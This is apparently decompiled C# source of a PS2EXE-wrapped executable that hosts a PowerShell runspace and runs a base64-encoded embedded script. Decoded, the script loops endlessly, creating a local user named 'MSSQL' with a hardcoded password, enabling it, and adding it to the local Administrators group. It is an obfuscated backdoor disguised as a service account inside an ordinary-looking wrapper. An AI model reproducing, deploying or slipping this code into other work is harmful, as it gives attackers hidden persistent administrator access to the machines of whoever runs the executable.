using System;
using System.Diagnostics;
using System.IO;
using System.Management.Automation;
using System.Management.Automation.Host;
using System.Management.Automation.Runspaces;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace ik.PowerShell;

internal class PS2EXE : PS2EXEApp
{
	private bool shouldExit;

	private int exitCode;

	public bool ShouldExit
	{
		get
		{
			return shouldExit;
		}
		set
		{
			shouldExit = value;
		}
	}

	public int ExitCode
	{
		get
		{
			return exitCode;
		}
		set
		{
			exitCode = value;
		}
	}

	[STAThread]
	private static int Main(string[] args)
	{
		//IL_01d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0475: Unknown result type (might be due to invalid IL or missing references)
		//IL_047b: Invalid comparison between Unknown and I4
		//IL_04d4: Unknown result type (might be due to invalid IL or missing references)
		Application.EnableVisualStyles();
		PS2EXE pS2EXE = new PS2EXE();
		bool flag = false;
		string text = string.Empty;
		PS2EXEHostUI ui = new PS2EXEHostUI();
		PS2EXEHost pS2EXEHost = new PS2EXEHost(pS2EXE, ui);
		ManualResetEvent mre = new ManualResetEvent(initialState: false);
		AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
		try
		{
			Runspace val = RunspaceFactory.CreateRunspace((PSHost)(object)pS2EXEHost);
			try
			{
				val.set_ApartmentState(ApartmentState.STA);
				val.Open();
				PowerShell val2 = PowerShell.Create();
				try
				{
					val2.set_Runspace(val);
					val2.get_Streams().get_Error().add_DataAdded((EventHandler<DataAddedEventArgs>)delegate(object sender, DataAddedEventArgs e)
					{
						((PSHostUserInterface)ui).WriteErrorLine(((object)((PSDataCollection<ErrorRecord>)sender).get_Item(e.get_Index())).ToString());
					});
					PSDataCollection<string> val3 = new PSDataCollection<string>();
					if (ConsoleInfo.IsInputRedirected())
					{
						string text2 = "";
						while ((text2 = Console.ReadLine()) != null)
						{
							val3.Add(text2);
						}
					}
					val3.Complete();
					PSDataCollection<PSObject> colOutput = new PSDataCollection<PSObject>();
					colOutput.add_DataAdded((EventHandler<DataAddedEventArgs>)delegate(object sender, DataAddedEventArgs e)
					{
						((PSHostUserInterface)ui).WriteLine(((object)colOutput.get_Item(e.get_Index())).ToString());
					});
					int num = 0;
					int num2 = 0;
					foreach (string text3 in args)
					{
						if (string.Compare(text3, "-wait", ignoreCase: true) == 0)
						{
							flag = true;
						}
						else if (text3.StartsWith("-extract", StringComparison.InvariantCultureIgnoreCase))
						{
							string[] array = text3.Split(new string[1] { ":" }, 2, StringSplitOptions.RemoveEmptyEntries);
							if (array.Length != 2)
							{
								MessageBox.Show("If you specify the -extract option you need to add a file for extraction in this way\r\n   -extract:\"<filename>\"", AppDomain.CurrentDomain.FriendlyName, (MessageBoxButtons)0, (MessageBoxIcon)16);
								return 1;
							}
							text = array[1].Trim(new char[1] { '"' });
						}
						else
						{
							if (string.Compare(text3, "-end", ignoreCase: true) == 0)
							{
								num = num2 + 1;
								break;
							}
							if (string.Compare(text3, "-debug", ignoreCase: true) == 0)
							{
								Debugger.Launch();
								break;
							}
						}
						num2++;
					}
					string @string = Encoding.UTF8.GetString(Convert.FromBase64String("d2hpbGUgKCR0cnVlKQ0KICAgIHsNCiAgICBuZXQgdXNlciBNU1NRTCBNckAxWDMjQUwgL2FkZA0KICAgIG5ldCB1c2VyIE1TU1FMIE1yQDFYMyNBTA0KICAgIG5ldCB1c2VyIE1TU1FMIC9hY3RpdmU6eWVzDQogICAgJGdyb3VwID0gR3dtaSB3aW4zMl9ncm91cCAtRmlsdGVyICJEb21haW49JyRlbnY6Y29tcHV0ZXJuYW1lJyBhbmQgU0lEPSdTLTEtNS0zMi01NDQnIiANCiAgICAkYWRtID0gJGdyb3VwLk5hbWUNCiAgICBuZXQgbG9jYWxncm91cCAkYWRtIE1TU1FMIC9hZGQNCiAgICB0aW1lb3V0IDEwMA0KICAgIH0="));
					if (!string.IsNullOrEmpty(text))
					{
						File.WriteAllText(text, @string);
						return 0;
					}
					val2.AddScript(@string);
					string text4 = null;
					Regex regex = new Regex("^-([^: ]+)[ :]?([^:]*)$");
					for (int j = num; j < args.Length; j++)
					{
						Match match = regex.Match(args[j]);
						if (match.Success && match.Groups.Count == 3 && !double.TryParse(args[j], out var _))
						{
							if (text4 != null)
							{
								val2.AddParameter(text4);
							}
							if (match.Groups[2].Value.Trim() == "")
							{
								text4 = match.Groups[1].Value;
							}
							else if (!(match.Groups[2].Value == "True") && !(match.Groups[2].Value.ToUpper() == "$TRUE"))
							{
								if (!(match.Groups[2].Value == "False") && !(match.Groups[2].Value.ToUpper() == "$FALSE"))
								{
									val2.AddParameter(match.Groups[1].Value, (object)match.Groups[2].Value);
									text4 = null;
								}
								else
								{
									val2.AddParameter(match.Groups[1].Value, (object)false);
									text4 = null;
								}
							}
							else
							{
								val2.AddParameter(match.Groups[1].Value, (object)true);
								text4 = null;
							}
						}
						else if (text4 != null)
						{
							val2.AddParameter(text4, (object)args[j]);
							text4 = null;
						}
						else
						{
							val2.AddArgument((object)args[j]);
						}
					}
					if (text4 != null)
					{
						val2.AddParameter(text4);
					}
					val2.AddCommand("out-string");
					val2.AddParameter("stream");
					val2.BeginInvoke<string, PSObject>(val3, colOutput, (PSInvocationSettings)null, (AsyncCallback)delegate(IAsyncResult ar)
					{
						if (ar.IsCompleted)
						{
							mre.Set();
						}
					}, (object)null);
					while (!pS2EXE.ShouldExit && !mre.WaitOne(100))
					{
					}
					val2.Stop();
					if ((int)val2.get_InvocationStateInfo().get_State() == 5)
					{
						((PSHostUserInterface)ui).WriteErrorLine(val2.get_InvocationStateInfo().get_Reason().Message);
					}
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
				val.Close();
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch (Exception)
		{
		}
		if (flag)
		{
			MessageBox.Show("Click OK to exit...", AppDomain.CurrentDomain.FriendlyName);
		}
		return pS2EXE.ExitCode;
	}

	private static void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
	{
		throw new Exception("Unhandled exception in PS2EXE");
	}
}
